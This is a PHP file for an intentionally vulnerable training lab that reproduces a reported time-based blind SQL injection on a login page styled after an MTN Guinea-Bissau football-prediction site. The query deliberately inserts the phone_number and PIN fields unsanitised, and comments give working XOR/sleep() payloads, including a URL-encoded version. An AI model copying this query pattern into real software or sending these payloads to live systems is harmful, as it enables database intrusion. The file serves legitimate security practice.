<?php
// ============================================================
// SQL Injection Lab 112 - Time-based Blind SQLi via phone_number
// Platform: futexpert.mtngbissau.com | HackerOne Report #1069531
// Endpoint: POST /signin/
// Vulnerability: phone_number POST param used raw in quoted SQL
// Payload: phone_number=0'XOR(if(now()=sysdate(),sleep(12),0))XOR'Z
// ============================================================

// --- Database Configuration ---
$server   = (getenv('DB_HOST') ?: (file_exists('/.dockerenv') ? 'krazeplanet' : '127.0.0.1'));
$username = "root";
$password = "";
$database = "KrazePlanet_DB";

$conn = mysqli_connect($server, $username, $password);
if (!$conn) die("Connection failed: " . mysqli_connect_error());

mysqli_query($conn, "CREATE DATABASE IF NOT EXISTS $database");
mysqli_select_db($conn, $database);

// --- Initialize Database ---
function initializeLab112Database($conn) {
    mysqli_query($conn, "CREATE TABLE IF NOT EXISTS lab112_users (
        id INT AUTO_INCREMENT PRIMARY KEY,
        phone_number VARCHAR(20) NOT NULL,
        pin VARCHAR(10) NOT NULL,
        full_name VARCHAR(100) NOT NULL,
        balance DECIMAL(10,2) NOT NULL DEFAULT 0.00
    )");

    mysqli_query($conn, "CREATE TABLE IF NOT EXISTS lab112_secret (
        id INT AUTO_INCREMENT PRIMARY KEY,
        secret_data VARCHAR(100) NOT NULL
    )");

    $check = mysqli_query($conn, "SELECT * FROM lab112_secret LIMIT 1");
    if (mysqli_num_rows($check) == 0) {
        mysqli_query($conn, "INSERT INTO lab112_secret (secret_data) VALUES ('flag{mtn_futexpert_sqli_1069531}')");
    }

    $checkUsers = mysqli_query($conn, "SELECT * FROM lab112_users LIMIT 1");
    if (mysqli_num_rows($checkUsers) == 0) {
        mysqli_query($conn, "INSERT INTO lab112_users (phone_number, pin, full_name, balance) VALUES
            ('245955123456', '4721', 'Mamadou Balde', 5250.00),
            ('245966234567', '8834', 'Fatima Camara', 1200.00),
            ('245977345678', '2290', 'Carlos Mendes', 8900.50)");
    }
}
initializeLab112Database($conn);

// --- Handle POST login ---
$formSubmitted = false;
$loginError    = '';
$loggedIn      = false;

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['submit'])) {
    $formSubmitted = true;

    $phone = $_POST['phone_number'] ?? '';
    $pin   = $_POST['pin']          ?? '';

    // ====================================================================
    // ⚠ VULNERABLE QUERY — phone_number is interpolated raw into a
    // single-quoted SQL string with NO sanitization or prepared statements.
    //
    // This allows a time-based blind SQL injection via the XOR pattern:
    //
    //   Payload (URL-decoded):
    //     phone_number=0'XOR(if(now()=sysdate(),sleep(5),0))XOR'Z
    //
    //   URL-encoded (as sent in HTTP POST body):
    //     phone_number=0%27XOR%28if%28now%28%29%3Dsysdate%28%29%2Csleep%285%29%2C0%29%29XOR%27Z
    //
    //   The payload injects after the opening single quote:
    //     WHERE phone_number = '0'XOR(if(now()=sysdate(),sleep(5),0))XOR'Z'
    //                              ↑ closes string, then XOR evaluates the if()
    //
    //   Confirm injection (from the actual report — 12-second delay):
    //     phone_number=0'XOR(if(now()=sysdate(),sleep(12),0))XOR'Z&pin=1&submit=Continuar
    //
    //   No delay (control test — multiply by 0):
    //     phone_number=0'XOR(if(now()=sysdate(),sleep(12*0),0))XOR'Z&pin=1&submit=Continuar
    // ====================================================================
    $sql    = "SELECT * FROM lab112_users WHERE phone_number = '$phone' AND pin = '$pin'";
    $result = mysqli_query($conn, $sql);

    if ($result && mysqli_num_rows($result) > 0) {
        $loggedIn   = true;
        $loginError = '';
    } else {
        $loginError = 'Credenciais inválidas. Verifique o número e o PIN.';
    }
}

$postedPhone = htmlspecialchars($_POST['phone_number'] ?? '');
$postedPin   = htmlspecialchars($_POST['pin']          ?? '');
?>
<!DOCTYPE html>
<html lang="pt">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>FutExpert — Entrar | MTN Guinea-Bissau</title>
<style>
*{box-sizing:border-box;margin:0;padding:0;}
body{font-family:'Segoe UI',system-ui,-apple-system,sans-serif;background:#f0f0f0;min-height:100vh;display:flex;flex-direction:column;}

/* ── Top bar ─────────────────────────────────────────────────────────────────── */
.topbar{background:#1a1a1a;padding:0;}
.topbar-inner{max-width:1100px;margin:0 auto;padding:0 20px;display:flex;align-items:center;height:44px;gap:16px;}
.mtn-logo{display:flex;align-items:center;gap:0;}
.mtn-m{font-size:1.1rem;font-weight:900;color:#FFCB00;letter-spacing:-.04em;}
.mtn-tn{font-size:1.1rem;font-weight:900;color:#fff;letter-spacing:-.04em;}
.topbar-sep{width:1px;height:22px;background:#444;}
.topbar-links{display:flex;gap:0;margin-left:auto;}
.topbar-links a{color:rgba(255,255,255,.65);font-size:.72rem;text-decoration:none;padding:0 12px;line-height:44px;transition:color .15s;}
.topbar-links a:hover{color:#FFCB00;}

/* ── Page ────────────────────────────────────────────────────────────────────── */
.page{flex:1;display:flex;align-items:stretch;}

/* ── Left panel ──────────────────────────────────────────────────────────────── */
.left-panel{background:#FFCB00;width:420px;flex-shrink:0;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:50px 40px;position:relative;overflow:hidden;}
.left-panel::before{content:'';position:absolute;bottom:-60px;right:-60px;width:220px;height:220px;background:rgba(0,0,0,.07);border-radius:50%;}
.left-panel::after{content:'';position:absolute;top:-40px;left:-40px;width:160px;height:160px;background:rgba(0,0,0,.05);border-radius:50%;}
.brand-icon{width:80px;height:80px;background:#1a1a1a;border-radius:16px;display:flex;align-items:center;justify-content:center;margin-bottom:22px;position:relative;z-index:1;}
.brand-icon svg{width:44px;height:44px;}
.brand-name{font-size:2rem;font-weight:900;color:#1a1a1a;letter-spacing:-.04em;position:relative;z-index:1;}
.brand-tagline{font-size:.82rem;color:#5a4800;margin-top:6px;text-align:center;line-height:1.5;position:relative;z-index:1;max-width:220px;}
.brand-by{font-size:.7rem;color:#7a6200;margin-top:18px;font-weight:600;position:relative;z-index:1;display:flex;align-items:center;gap:5px;}
.brand-by .mtn-badge{background:#1a1a1a;color:#FFCB00;font-weight:900;font-size:.72rem;padding:2px 8px;border-radius:3px;}

.stats-row{display:flex;gap:20px;margin-top:28px;position:relative;z-index:1;}
.stat-box{background:rgba(0,0,0,.1);border-radius:8px;padding:10px 16px;text-align:center;}
.stat-num{font-size:1.1rem;font-weight:900;color:#1a1a1a;}
.stat-lbl{font-size:.62rem;color:#5a4800;font-weight:600;text-transform:uppercase;letter-spacing:.05em;}

/* ── Right panel ─────────────────────────────────────────────────────────────── */
.right-panel{flex:1;display:flex;align-items:center;justify-content:center;padding:40px 20px;}
.login-card{background:#fff;border-radius:10px;box-shadow:0 4px 24px rgba(0,0,0,.1);padding:36px 36px;width:100%;max-width:400px;}
.login-card-title{font-size:1.15rem;font-weight:800;color:#1a1a1a;margin-bottom:4px;}
.login-card-sub{font-size:.78rem;color:#6b7280;margin-bottom:24px;}

/* ── Form ────────────────────────────────────────────────────────────────────── */
.form-group{margin-bottom:16px;}
.form-label{display:block;font-size:.75rem;font-weight:700;color:#374151;margin-bottom:5px;}
.input-wrap{position:relative;display:flex;align-items:stretch;}
.input-prefix{background:#f3f4f6;border:1px solid #d1d5db;border-right:none;border-radius:5px 0 0 5px;padding:0 10px;font-size:.8rem;color:#6b7280;font-weight:600;display:flex;align-items:center;gap:4px;white-space:nowrap;flex-shrink:0;}
.input-prefix .flag{font-size:.9rem;}
.form-input{flex:1;padding:9px 12px;border:1px solid #d1d5db;border-radius:0 5px 5px 0;font-size:.85rem;color:#1a1a1a;outline:none;font-family:inherit;transition:border-color .15s,box-shadow .15s;}
.form-input.no-prefix{border-radius:5px;}
.form-input:focus{border-color:#FFCB00;box-shadow:0 0 0 2px rgba(255,203,0,.25);}
.form-hint{font-size:.68rem;color:#9ca3af;margin-top:3px;}
.form-input.pin-input{letter-spacing:.2em;font-size:.95rem;font-weight:600;}

/* ── Error ───────────────────────────────────────────────────────────────────── */
.alert-err{background:#fef2f2;border:1px solid #fecaca;border-radius:5px;padding:9px 12px;margin-bottom:16px;font-size:.78rem;color:#dc2626;display:flex;align-items:center;gap:7px;}
.alert-err svg{width:14px;height:14px;flex-shrink:0;}
.alert-ok{background:#f0fdf4;border:1px solid #bbf7d0;border-radius:5px;padding:9px 12px;margin-bottom:16px;font-size:.78rem;color:#16a34a;display:flex;align-items:center;gap:7px;}
.alert-ok svg{width:14px;height:14px;flex-shrink:0;}

/* ── Submit ──────────────────────────────────────────────────────────────────── */
.btn-submit{width:100%;background:#FFCB00;color:#1a1a1a;border:none;border-radius:6px;padding:11px;font-size:.9rem;font-weight:800;cursor:pointer;font-family:inherit;transition:background .15s,transform .1s;margin-top:4px;}
.btn-submit:hover{background:#e6b800;}
.btn-submit:active{transform:scale(.99);}

/* ── Footer links ────────────────────────────────────────────────────────────── */
.form-footer{text-align:center;margin-top:18px;font-size:.73rem;color:#9ca3af;}
.form-footer a{color:#6b7280;text-decoration:none;font-weight:600;}
.form-footer a:hover{color:#1a1a1a;text-decoration:underline;}
.divider{display:flex;align-items:center;gap:10px;margin:16px 0;color:#d1d5db;font-size:.72rem;}
.divider::before,.divider::after{content:'';flex:1;height:1px;background:#e5e7eb;}

/* ── Endpoint pill ───────────────────────────────────────────────────────────── */
.endpoint-pill{background:#1a1a1a;color:#FFCB00;font-family:monospace;font-size:.62rem;padding:3px 8px;border-radius:3px;float:right;margin-top:2px;letter-spacing:.02em;}

/* ── Footer ──────────────────────────────────────────────────────────────────── */
.footer{background:#1a1a1a;color:rgba(255,255,255,.5);padding:14px 20px;font-size:.7rem;}
.footer-inner{max-width:1100px;margin:0 auto;display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:8px;}
.footer a{color:rgba(255,255,255,.5);text-decoration:none;}.footer a:hover{color:#FFCB00;}
.footer-links{display:flex;gap:14px;}

@media(max-width:700px){.left-panel{display:none;}.right-panel{padding:24px 16px;}}
</style>
</head>
<body>

<!-- Top bar -->
<div class="topbar">
  <div class="topbar-inner">
    <div class="mtn-logo">
      <span class="mtn-m">M</span><span class="mtn-tn">TN</span>
    </div>
    <div class="topbar-sep"></div>
    <span style="font-size:.72rem;color:rgba(255,255,255,.5);">Guinea-Bissau</span>
    <div class="topbar-links">
      <a href="#">Início</a>
      <a href="#">Jogos</a>
      <a href="#">Resultados</a>
      <a href="#">Suporte</a>
    </div>
  </div>
</div>

<!-- Page -->
<div class="page">

  <!-- Left panel — Branding -->
  <div class="left-panel">
    <div class="brand-icon">
      <svg viewBox="0 0 44 44" fill="none">
        <!-- Football icon -->
        <circle cx="22" cy="22" r="18" stroke="#FFCB00" stroke-width="2.5"/>
        <polygon points="22,8 26,16 34,16 28,22 30,30 22,26 14,30 16,22 10,16 18,16" fill="#FFCB00"/>
      </svg>
    </div>
    <div class="brand-name">FutExpert</div>
    <div class="brand-tagline">O melhor jogo de previsão de futebol de Guiné-Bissau</div>
    <div class="brand-by">
      <span>Desenvolvido por</span>
      <span class="mtn-badge">MTN</span>
    </div>
    <div class="stats-row">
      <div class="stat-box">
        <div class="stat-num">12K+</div>
        <div class="stat-lbl">Jogadores</div>
      </div>
      <div class="stat-box">
        <div class="stat-num">500+</div>
        <div class="stat-lbl">Jogos / Mês</div>
      </div>
      <div class="stat-box">
        <div class="stat-num">GNF 1M</div>
        <div class="stat-lbl">Prémios</div>
      </div>
    </div>
  </div>

  <!-- Right panel — Login form -->
  <div class="right-panel">
    <div class="login-card">
      <div style="display:flex;align-items:flex-start;justify-content:space-between;margin-bottom:20px;">
        <div>
          <div class="login-card-title">Entrar na sua conta</div>
          <div class="login-card-sub">Introduza o seu número MTN e PIN de acesso</div>
        </div>
        <span class="endpoint-pill">POST /signin/</span>
      </div>

      <?php if ($formSubmitted && $loggedIn): ?>
      <div class="alert-ok">
        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M20 6L9 17l-5-5"/></svg>
        Bem-vindo! Sessão iniciada com sucesso.
      </div>
      <?php elseif ($formSubmitted && $loginError): ?>
      <div class="alert-err">
        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>
        <?= htmlspecialchars($loginError) ?>
      </div>
      <?php endif; ?>

      <form method="POST" action="index.php">
        <div class="form-group">
          <label class="form-label" for="phone_number">Número de Telefone</label>
          <div class="input-wrap">
            <span class="input-prefix">
              <span class="flag">🇬🇼</span>
              +245
            </span>
            <input class="form-input" type="text" id="phone_number" name="phone_number"
              value="<?= $postedPhone ?>"
              placeholder="955 123 456"
              autocomplete="off" autocorrect="off" spellcheck="false">
          </div>
          <div class="form-hint">Número MTN de Guiné-Bissau (sem código do país)</div>
        </div>

        <div class="form-group">
          <label class="form-label" for="pin">PIN de Acesso</label>
          <input class="form-input no-prefix pin-input" type="password" id="pin" name="pin"
            value="<?= $postedPin ?>"
            placeholder="••••"
            maxlength="6" autocomplete="current-password">
          <div class="form-hint">PIN de 4 a 6 dígitos definido no registo</div>
        </div>

        <button class="btn-submit" type="submit" name="submit" value="Continuar">
          Continuar →
        </button>
      </form>

      <div class="divider">ou</div>
      <div class="form-footer">
        <a href="#">Esqueceu o PIN?</a> &nbsp;·&nbsp; <a href="#">Registar conta</a>
      </div>
      <div class="form-footer" style="margin-top:10px;">
        <a href="#">Termos de Utilização</a> &nbsp;·&nbsp; <a href="#">Privacidade</a>
      </div>
    </div>
  </div>

</div>

<footer class="footer">
  <div class="footer-inner">
    <span>© <?= date('Y') ?> MTN Guinea-Bissau · FutExpert &nbsp;·&nbsp; futexpert.mtngbissau.com</span>
    <div class="footer-links">
      <a href="https://hackerone.com/reports/1069531" target="_blank">HackerOne #1069531</a>
      <a href="#">Suporte</a>
      <a href="#">Contacto</a>
    </div>
  </div>
</footer>

</body>
</html>
